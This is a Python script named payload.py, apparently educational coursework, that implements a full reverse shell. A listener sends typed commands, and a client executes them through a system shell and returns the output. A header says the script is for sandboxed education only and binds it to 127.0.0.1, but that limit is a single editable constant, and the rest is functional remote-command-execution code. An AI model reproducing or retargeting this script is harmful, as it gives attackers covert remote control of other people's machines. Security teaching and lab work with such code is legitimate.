# ETHICAL USE STATEMENT:
# This script is for EDUCATIONAL purposes in a local sandboxed environment ONLY.
# The reverse shell connects to localhost (127.0.0.1) only.
# Do NOT deploy against external systems. Unauthorized use violates UOP policy
# and may be a criminal offense under Jordanian cybercrime law.
#
# HOW TO TEST:
#   Terminal 1: python payload.py listen
#   Terminal 2: python payload.py shell

import socket
import subprocess
import sys
from datetime import datetime

HOST = "127.0.0.1"   # localhost only - never change this
PORT = 4444


def listen():
    print(f"[*] Listener started on {HOST}:{PORT}")
    print("[!] Sandboxed - localhost connections only\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"[+] Shell connected from: {addr}")
    print("[+] Type commands. Type 'exit' to quit.\n")
    print("-" * 40)

    while True:
        try:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            if cmd == "exit":
                conn.send(b"exit\n")
                break
            conn.send((cmd + "\n").encode())

            conn.settimeout(3)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    output += chunk
            except socket.timeout:
                pass

            print(output.decode(errors="ignore"), end="")
        except KeyboardInterrupt:
            break

    conn.close()
    server.close()
    print("\n[*] Session closed.")


def shell():
    print(f"[*] Connecting to {HOST}:{PORT}")
    print("[!] Sandboxed - localhost only\n")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        print("[+] Connected.\n")

        while True:
            data = s.recv(4096).decode(errors="ignore").strip()
            if not data or data == "exit":
                break
            try:
                result = subprocess.run(data, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr or "(no output)\n"
                s.send(output.encode())
            except subprocess.TimeoutExpired:
                s.send(b"[!] Timed out\n")
            except Exception as e:
                s.send(f"[!] {e}\n".encode())

        s.close()
    except ConnectionRefusedError:
        print("[!] No listener found. Run: python payload.py listen")


mode = sys.argv[1] if len(sys.argv) > 1 else "help"
print(f"\n[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

if mode == "listen":
    listen()
elif mode == "shell":
    shell()
else:
    print("\nUsage:")
    print("  python payload.py listen   <- Terminal 1")
    print("  python payload.py shell    <- Terminal 2")
    print(f"\n  Host: {HOST} | Port: {PORT}")
